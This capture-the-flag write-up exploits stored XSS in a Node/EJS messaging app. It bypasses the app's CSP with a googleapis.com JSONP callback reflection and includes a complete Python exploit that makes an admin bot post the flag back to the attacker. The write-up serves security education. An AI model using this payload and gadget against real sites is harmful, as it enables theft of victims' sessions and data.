# HTB Web Challenge — "Massagold" — Writeup

**Target:** `154.57.164.76:30926`
**Category:** Web / Stored XSS + CSP allowlist bypass (JSONP gadget)
**Stack:** Node.js/Express, EJS templates, express-session, SQLite, Playwright
(Firefox) admin bot

## Summary

A ravens/letters messaging app lets any registered user send a message to
`admin`. The moment a message is sent to `admin`, a headless-browser bot
automatically logs in as admin and opens it. Message content is rendered
**unescaped** in the view, giving stored XSS — but a strict Content-Security-
Policy blocks inline scripts and blocks arbitrary outbound `fetch()`/`XHR`
via `connect-src 'self'`. The CSP's `script-src` allowlist includes
`https://www.googleapis.com`, and one of Google's public JSONP endpoints
reflects the `callback` parameter verbatim as executable JS even when it
"validates" and rejects the name — turning a trusted third-party domain into
a script-src bypass gadget. Because `connect-src` only allows same-origin
requests, exfiltration can't go to an external listener (e.g. webhook.site)
— instead, the injected script makes the *admin's own browser* POST the
flag back into a brand-new message addressed to the attacker's own inbox,
which is then read normally over HTTP.

## Step-by-step

### 1. Recon the source tree
```bash
tree app
cat entrypoint.js
cat bot/bot.js
cat config/nginx.conf
cat config/supervisord.conf
```
Key findings:
- `entrypoint.js` seeds several users and messages at boot, including one
  from `archivist → admin` containing the flag — this becomes the
  **first inserted message row**, i.e. `messages.id = 1`.
- `bot/bot.js` (Playwright/Firefox): reads admin credentials from a local
  JSON file (unreachable to us), logs in as admin, and visits
  `/messages/<id>` whenever `enqueueMessageVisit(id)` is called.
- nginx just reverse-proxies everything to the Node app — no extra logic
  there.

### 2. Find the trigger and the sink
```bash
cat app/routes.js
cat app/controllers/messageController.js
cat app/views/message.ejs
```
- `messageController.sendMessage`:
  ```js
  if (recipient.username === 'admin') {
    enqueueMessageVisit(result.lastID);
  }
  ```
  Sending a message to `admin` automatically triggers the bot to visit it.
- `showMessage`'s DB query correctly scopes by `recipient_id = ?`, so this
  is *not* an IDOR — the bot genuinely owns/reads the flag message as
  admin, which is why XSS (not access-control abuse) is the path in.
- `message.ejs`:
  ```ejs
  <pre class="letter-copy"><%- message.content %></pre>
  ```
  `<%- %>` is EJS's **unescaped** output — raw HTML/JS in `content` gets
  parsed and executed by whoever views the message. This is the stored
  XSS sink.

### 3. Check for a CSP blocking naive payloads
```bash
curl -sI -b cookies.txt http://<target>/messages/1
```
Response included:
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://www.googleapis.com; style-src 'self'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; object-src 'none'; form-action 'self'; frame-ancestors 'none'
```
This ruled out a plain `<script>alert(1)</script>` (no `'unsafe-inline'`)
and also ruled out exfiltrating via `fetch()` to an external server
(`connect-src 'self'` only allows same-origin requests).

The one deliberately-placed allowlist entry — `https://www.googleapis.com`
— is the intended bypass gadget. Confirmed by inspecting `app/server.js`:
the CSP is a static, hardcoded header (not conditional on any input we
control), ruling out a simpler bypass and confirming the googleapis
allowlist is the real puzzle piece.

### 4. Find a JSONP reflection gadget on googleapis.com
```bash
curl -s "https://www.googleapis.com/customsearch/v1?key=x&cx=x&q=x&callback=alert(1)"
curl -s "https://www.googleapis.com/books/v1/volumes?q=test&callback=alert(1)"
```
Both returned:
```
// API callback
alert(1)({
  "error": {
    "code": 400,
    "message": "Invalid JSONP callback name: 'alert(1)'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed.",
    ...
  }
}
);
```
Key insight: even though the server *says* the callback name failed
validation, it still reflects the **raw, unfiltered callback string**
verbatim as the JS wrapper function before appending `(...)`. The
character-allowlist is enforced for the error message text, not for what
actually gets echoed back as executable code. That means arbitrary JS
(not just identifier-safe characters) can be smuggled in as the callback
value.

Confirmed the response is actually script-executable (not just JSON):
```bash
curl -s -D - -o /dev/null "https://www.googleapis.com/books/v1/volumes?q=test&callback=x"
```
```
content-type: text/javascript; charset=UTF-8
```
This is exactly the content-type a `<script src="...">` tag needs to
execute the response as real JavaScript.

### 5. Build the exploit script

The payload needs to, from inside the admin bot's authenticated session:
1. `fetch('/messages/1')` — read the flag message (same-origin, allowed
   by `connect-src 'self'`).
2. Parse out the flag text from `.letter-copy`.
3. Exfiltrate **without violating `connect-src 'self'`** — the trick is
   to `POST` a *new message* back to the app itself (same origin, so
   allowed) addressed to the attacker's own username, using the app's own
   `/messages` endpoint. This turns the target app into its own covert
   channel back to the attacker's inbox.

```python
import requests, sys, time, random, string, urllib.parse
from bs4 import BeautifulSoup

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def main():
    target_url = sys.argv[1].rstrip('/')
    username = "attacker_" + generate_random_string()
    password = "password123"

    session = requests.Session()

    # Register (also logs us in)
    session.post(f"{target_url}/register", data={
        "username": username, "password": password
    }, allow_redirects=True)

    # JS that runs inside the admin's browser once the bot opens our message
    js_payload = (
        "fetch('/messages/1')"
        ".then(function(r){return r.text()})"
        ".then(function(t){"
        "var doc=new DOMParser().parseFromString(t,'text/html');"
        "var el=doc.querySelector('.letter-copy');"
        "var flag=el?el.textContent:'NO_FLAG_ELEMENT_FOUND';"
        "fetch('/messages',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        f"body:'to_username={username}&content='+encodeURIComponent(flag)"
        "})"
        "});0"
    )

    # CRITICAL: URL-encode the JS before inserting it into the callback=
    # query parameter — it contains a raw '&' (from the POST body string)
    # which would otherwise prematurely terminate the query parameter and
    # corrupt the payload.
    encoded_payload = urllib.parse.quote(js_payload)

    xss_payload = (
        '<script src="https://www.googleapis.com/customsearch/v1?'
        f'callback={encoded_payload}"></script>'
    )

    # Send it to admin — this auto-triggers the bot via enqueueMessageVisit()
    session.post(f"{target_url}/messages", data={
        "to_username": "admin",
        "content": xss_payload
    })

    # Poll our own inbox until the admin bot's reply (containing the flag) arrives
    for _ in range(12):
        time.sleep(2)
        r = session.get(target_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        for a in soup.find_all('a', href=True):
            if '/messages/' not in a['href']:
                continue
            msg_id = a['href'].rstrip('/').split('/')[-1]
            msg_r = session.get(f"{target_url}/messages/{msg_id}")
            letter = BeautifulSoup(msg_r.text, 'html.parser').find(class_='letter-copy')
            if letter and 'HTB{' in letter.text:
                print(letter.text.strip())
                return

if __name__ == "__main__":
    main()
```

### 6. Run it
```bash
python3 exploit.py http://154.57.164.76:30926
```
Output:
```
[*] Sending XSS payload to admin...
[*] Message sent. Waiting for the admin bot to visit and execute the payload...
[+] Successfully retrieved flag:
Archive notice:
The sealed royal record reads:
HTB{m3554g3_1n_7h3_cu570dy_ch41n_395c0314e5e2604428c69eec372fac3e}
```

## Flag
```
HTB{m3554g3_1n_7h3_cu570dy_ch41n_395c0314e5e2604428c69eec372fac3e}
```

## Root causes

1. **Unescaped template output** — EJS `<%- message.content %>` renders
   raw HTML/JS instead of escaping it (`<%= %>` would have prevented the
   XSS entirely).
2. **Hostname-based CSP allowlisting** — trusting an entire domain
   (`https://www.googleapis.com`) in `script-src` implicitly trusts every
   endpoint on it, including legacy JSONP endpoints that reflect
   attacker-controlled strings as executable code.
3. **JSONP callback "validation" that still reflects on failure** — the
   Google endpoint rejects invalid callback names semantically (in the
   JSON error body) but still echoes the raw name back as the literal JS
   function wrapper, which is enough to run arbitrary code regardless of
   the character restriction message.

## Takeaways / patterns to remember

- **Always check `<%- %>` vs `<%= %>` in EJS** (and equivalent raw-output
  syntax in other template engines — `{{{ }}}` in Handlebars, `| safe` in
  Jinja2, `v-html` in Vue, `dangerouslySetInnerHTML` in React) as the
  first thing when hunting for stored XSS sinks.
- **When a CSP blocks inline scripts but allowlists a third-party
  domain, check that domain for JSONP endpoints.** This is a classic,
  still-relevant bypass technique (see: PortSwigger's CSP bypass
  cheatsheet, the old JSONBee project) precisely because JSONP callback
  parameters often get reflected as raw script text.
- **Don't assume input validation errors prevent reflection.** A server
  can correctly detect and report that input is "invalid" while still
  echoing the raw invalid input back into an executable context. Always
  test what's *actually returned*, not just whether validation fired.
- **`connect-src 'self'` blocks outbound exfil via fetch/XHR, but doesn't
  block the app's own same-origin endpoints.** If the vulnerable app has
  *any* way to persist/display attacker-readable data (a messaging
  feature, a comment thread, a shared document), you can often use the
  app itself as the exfiltration channel instead of needing external
  network egress from the target's environment.
- **When debugging "is my XSS payload even running," add explicit stage
  beacons** (e.g. fire a distinguishable request at the very start of the
  script, before any risky logic) so you can tell "script never executed"
  apart from "script executed but a later step failed" — this narrows
  debugging fast instead of guessing blind.
